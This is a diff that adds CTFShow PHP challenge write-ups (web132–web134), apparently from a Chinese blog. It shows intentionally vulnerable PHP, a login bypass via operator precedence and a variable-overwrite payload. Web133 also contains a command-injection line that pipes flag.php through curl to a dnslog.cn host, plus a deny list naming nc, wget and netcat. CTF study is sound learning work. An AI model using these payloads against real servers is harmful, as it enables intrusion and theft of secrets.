@@ -1035,6 +1035,67 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&#x27;http://f16472c2-b4b2-4983-8528-8630be8b0610.challenge.ctf.show:8080/&#x27;</span> </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web131.png"></p>
+<h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>首先打开发现为一个 blog 页面 没有什么可用信息 所以尝试目录爆破:</p>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132.png"></p>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132_1.png"></p>
+<p>从爆破结果如上图所示,其中 /admin/可以打开，原来把题目藏在了这个页面:</p>
+<p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 06:22:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 20:05:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>首先阅读程序上下文，发现有三个 $_GET 的参数: username, password, code</li>
+<li>然后继续往下可以看到 mt_rand(1,0x36D) 这个函数的作用 是生成随机数从 1-877 ，详情看手册</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132_2.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>从这条 if 语句 可以知道 两个运算符 &amp;&amp; 和 || 根据优先级 添加括号使得易于理解:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span>) || (<span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这个 if 语句 存在两种情况，1:|| 的前部分(左边) 为 TRUE  2: || 的后部分为(右边) True, 从这里可以知道了，让前面的表达式为FALSE ，后面的表示为 TRUE 就可以绕过 随机数。是的程序继续向下执行:</li>
+<li>下一个 if 的条件为 $code == ‘admin’ 、</li>
+<li>综上所述可以得到: </li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web132_3.png"></p>
+<h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 16:43:44</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>这道题对我来说又是一个知识盲区，只有看看大佬方法了:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`; curl `cat flag.php | grep <span class="string">&quot;flag&quot;</span>`<span class="number">.9</span>b8kh6.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web133.png"></p>
+<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-14 23:01:06</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li><p>首先阅读程序上下文，定义了两个变量，第一个if()判断对GET 和 POST 的参数进行匹配，如果有则狗带了。</p>
+</li>
+<li><p>parse_str() 又出现了： 将字符串解析成多个变量，没有返回值；</p>
+</li>
+<li><p>$_SERVER[‘QUERY_STRING’] 又出现了： 查询字符串，在本题中将，将得到字符串然后作为 parse_str()的参数执行。那么字符串的内容就会变为多个变量。举个例子: _POST[a]=1&amp;_POST[b]=2; 将 _POST[a] 和 _POST[b] 为了变量, $ _POST[a] 和 $ _POSTarr[b];</p>
+</li>
+<li><p>extract()又出现了：从数组中将变量导入到当前的符号表，检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。 举个例子：_ POST[a]=1,_POST[b]=2; 将键名 a 和 b 作为了变量，所以 $a=1,$b=2;</p>
+</li>
+<li><p>最后一个 if() 判断，使 $key1 和 $key2 等于 36d 才能得到最后的 flag。那么在上一步 extract() 变量覆盖中，我们需要将 key1 和 key2 作为某个数组的 键名， 再往上一步 parse_str() 字符串解析为变量，传入的字符串得包含 key1 和 key2。如果直接将 key1 和 key2作为变量名，就不能被extract()覆盖作为数组的 键名。因此传入的字符串必须是个数组且键名得是 key1 和 key2。</p>
+</li>
+<li><p>本地验证:</p>
+</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web134.png"></p>
+<ul>
+<li>最终结果: ?_POST[key1]=36d&amp;_POST[key2]=36d</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web134_1.png"></p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
